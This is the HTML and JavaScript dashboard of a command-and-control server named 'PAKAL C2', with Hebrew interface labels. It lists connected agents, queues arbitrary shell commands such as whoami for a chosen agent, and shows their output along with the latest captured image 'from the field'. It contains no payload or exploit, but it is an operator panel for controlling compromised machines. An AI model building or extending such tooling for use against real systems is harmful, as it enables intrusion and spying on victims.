<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command & Control Panel</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #58a6ff; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        .container { display: flex; gap: 20px; max-width: 1200px; margin: 0 auto; }
        .panel { background-color: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; flex: 1; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; text-align: right; }
        th { color: #8b949e; }
        .status-true { color: #3fb950; font-weight: bold; }
        .status-false { color: #f85149; font-weight: bold; }
        .input-group { display: flex; gap: 10px; margin-top: 15px; }
        input, select { background-color: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 8px; border-radius: 4px; flex: 1; }
        button { background-color: #238636; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        button:hover { background-color: #2ea043; }
        .log-box { background-color: #010409; border: 1px solid #30363d; height: 300px; overflow-y: auto; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 14px; direction: ltr; text-align: left; }
        .stat-badge { background-color: #1f6feb; padding: 4px 8px; border-radius: 12px; font-size: 12px; color: white; }
        .image-box {
    background-color: #010409;
    border: 1px solid #30363d;
    height: 250px; /* אפשר לשנות את הגובה לפי הצורך */
    margin-top: 10px;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    text-align: center;
}
.image-box img {
    max-width: 100%;
    max-height: 100%;
    display: none; /* מוסתר עד שתגיע תמונה */
    border-radius: 4px;
}
    </style>
</head>
<body>

    <h1>⚡ PAKAL C2 Server Dashboard</h1>

    <div class="container">
        <div class="panel">
            <h2>סוכנים מחוברים</h2>
            <table id="agents-table">
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>IP Address</th>
                        <th>Encrypted</th>
                        <th>Last Seen</th>
                    </tr>
                </thead>
                <tbody>
                    </tbody>
            </table>

            <h2 style="margin-top: 30px;">שליחת פקודה</h2>
            <div class="input-group">
                <select id="agent-select">
                    <option value="">בחר סוכן...</option>
                </select>
                <input type="text" id="command-input" placeholder="הכנס פקודה (לדוגמה: dir, whoami)">
                <button onclick="sendCommand()">שלח פקודה</button>
            </div>
            <p style="margin-top: 10px; font-size: 14px; color: #8b949e;">פקודות ממתינות בתור: <span id="queue-count" class="stat-badge">0</span></p>
        </div>

        <div class="panel">
            <h2>תוצאות מהשטח</h2>
            <div class="log-box" id="responses-log">
                </div>
            <h2 style="margin-top: 30px;">תמונה אחרונה מהשטח</h2>
<div class="image-box" id="latest-image-container">
    <span id="image-placeholder" style="color: #8b949e;">ממתין לתמונה...</span>
    <img id="latest-image" src="" alt="תמונה מהשטח">
</div>
        </div>
    </div>

    <script>
        async function fetchStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                if (data.latest_image) {
                    updateLatestImage(data.latest_image);}
                // עדכון תור הפקודות
                document.getElementById('queue-count').innerText = data.queue_size;

                // עדכון טבלת סוכנים ורשימת הבחירה
                const tbody = document.querySelector('#agents-table tbody');
                const select = document.getElementById('agent-select');

                tbody.innerHTML = '';
                let selectOptions = '<option value="">בחר סוכן...</option>';

                for (const [id, info] of Object.entries(data.agents)) {
                    const statusClass = info.is_encrypted === 'True' ? 'status-true' : 'status-false';
                    tbody.innerHTML += `
                        <tr>
                            <td style="font-family: monospace;">${id}</td>
                            <td>${info.ip_addr}</td>
                            <td class="${statusClass}">${info.is_encrypted}</td>
                            <td>${info.last_seen.split('.')[0]}</td>
                        </tr>
                    `;
                    if (info.is_encrypted === 'True') {
                        selectOptions += `<option value="${id}">${id} (${info.ip_addr})</option>`;
                    }
                }

                // עדכון הסלקט רק אם מספר הסוכנים השתנה כדי לא להפריע לבחירה של המשתמש
                if(select.options.length - 1 !== Object.keys(data.agents).length) {
                     select.innerHTML = selectOptions;
                }

                // עדכון לוג התשובות
                const logBox = document.getElementById('responses-log');
                logBox.innerHTML = '';
                data.responses.forEach(res => {
                    logBox.innerHTML += `<div style="margin-bottom: 10px; border-bottom: 1px dashed #30363d; padding-bottom: 5px;">
                        <span style="color: #79c0ff;">[${res.time}]</span>
                        <span style="color: #ff7b72;">[Agent: ${res.agent}]</span><br>
                        <span style="color: #d2a8ff;">${res.data.replace(/\\n/g, '<br>')}</span>
                    </div>`;
                });

            } catch (error) {
                console.error("Error fetching status:", error);
            }
        }

        async function sendCommand() {
            const agentId = document.getElementById('agent-select').value;
            const command = document.getElementById('command-input').value;

            if (!agentId || !command) {
                alert("אנא בחר סוכן והזן פקודה");
                return;
            }

            try {
                const response = await fetch('/api/send_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId, command: command })
                });
                if(response.ok) {
                    document.getElementById('command-input').value = '';
                    fetchStatus(); // עדכון מיידי
                }
            } catch (error) {
                console.error("Error sending command:", error);
            }
        }

        // רענון אוטומטי כל 2 שניות
        setInterval(fetchStatus, 2000);
        fetchStatus();

        // פונקציה לעדכון התמונה - קרא לה כשהמידע מההזרמה יגיע
function updateLatestImage(imageSource) {
    const imgElement = document.getElementById('latest-image');
    const placeholder = document.getElementById('image-placeholder');

    if (imageSource) {
        imgElement.src = imageSource;
        imgElement.style.display = 'block'; // מציג את התמונה
        placeholder.style.display = 'none'; // מעלים את הטקסט
    }
}
    </script>
</body>
</html>
